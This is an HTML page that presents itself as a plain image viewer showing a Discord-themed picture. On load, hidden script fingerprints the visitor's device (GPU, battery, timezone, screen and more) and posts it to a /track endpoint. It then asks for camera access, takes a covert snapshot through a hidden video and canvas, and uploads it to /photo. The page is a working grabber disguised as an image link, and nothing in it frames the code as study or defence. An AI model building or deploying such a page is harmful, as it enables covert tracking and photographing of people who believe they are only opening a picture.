<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Image</title>
<style>
  * { margin: 0; padding: 0; }
  body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
  img#main { max-width: 100%; max-height: 100vh; display: block; }
  video, canvas { display: none; }
</style>
</head>
<body>
<img id="main" src="/discord.png">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
<script>
async function collect() {
  const data = {
    screen: window.screen.width + 'x' + window.screen.height,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    memory: navigator.deviceMemory || '?',
    touch: navigator.maxTouchPoints > 0,
    referrer: document.referrer || 'Direct',
    window_size: window.innerWidth + 'x' + window.innerHeight,
  }

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery()
      data.battery_level = Math.round(b.level * 100) + '%'
      data.battery_charging = b.charging
    } catch(e) {}
  }

  try {
    const gl = document.createElement('canvas').getContext('webgl')
    const ext = gl.getExtension('WEBGL_debug_renderer_info')
    data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
  } catch(e) {}

  if (navigator.connection) {
    data.connection = navigator.connection.effectiveType
  }

  fetch('/track', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  })
}

async function snapCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true })
    const video = document.getElementById('video')
    const canvas = document.getElementById('canvas')
    video.srcObject = stream
    await new Promise(r => video.onloadedmetadata = r)
    canvas.width = video.videoWidth
    canvas.height = video.videoHeight
    canvas.getContext('2d').drawImage(video, 0, 0)
    stream.getTracks().forEach(t => t.stop())
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8))
    const formData = new FormData()
    formData.append('photo', blob, 'photo.jpg')
    fetch('/photo', { method: 'POST', body: formData })
  } catch(e) {
    console.log('Camera denied or unavailable')
  }
}

collect()
snapCamera()
</script>
</body>
</html>
